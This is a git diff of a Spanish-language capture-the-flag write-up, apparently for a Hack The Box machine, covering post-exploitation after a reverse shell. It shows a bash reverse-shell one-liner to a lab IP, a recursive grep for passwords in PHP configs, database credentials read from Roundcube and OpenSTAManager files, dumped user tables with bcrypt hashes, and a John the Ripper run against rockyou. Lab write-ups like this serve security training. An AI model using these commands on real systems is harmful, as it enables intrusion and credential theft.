@@ -260,12 +260,57 @@ bash -c "bash -i >& /dev/tcp/10.10.17.250/443 0>&1"
 ### Luego tratamos la tty y buscamos información
 Encontramos un archivo config.ini.php en la ruta `~/html/roundcube/`
 
-### Config.ini.php 
+### Roundcube Config.ini.php 
 - link: mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail
 - user: roundcube
 
 ```sh
-mysql -h localhost -P 3306 -u roundcube -p roundcubeemail
+mysql -h localhost -P 3306 -u roundcube -p roundcubemail
+
+# información de la db
+
++---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
+| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
++---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
+|       1 | kevin    | localhost | 2026-05-26 11:00:00 | 2026-05-26 11:10:22 | 2026-05-26 11:10:06 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"jXKCkTD6NJX1CfH7";} |
+|       2 | sarah    | localhost | 2026-05-26 11:01:39 | 2026-05-26 11:01:39 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"E2t73i4vcknHDz71";} |
++---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
 ```
+
+Seguimos buscando cosas y encontramos otro archivo config
+```sh
+# busqueda recursiva 
+grep -rn --include="*.php" "pass" ~/html/ --exclude-dir={vendor,node_modules,cache,templates,include,plugins,src,modules,program}
+
+# vemos esto: /var/www/html/openstamanager/config.inc.php:24:$db_password = 'Fri3nds@9099';
+# leemos el archivo
+$db_host = 'localhost';
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name = 'openstamanager';
+
+# nos conectamos
+mysql -h localhost -P 3306 -u brollin -p openstamanager
+
+# encontramos en DB: Openstamanager
+mysql> select * from zz_users;
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
+| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
+|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
+|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
++----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
+
+```
+
+### Aplicando John The Ripper
+```sh
+# creo un archivo hashes.txt y se lo paso 
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Respuesta
+```
+
+ 
 
 
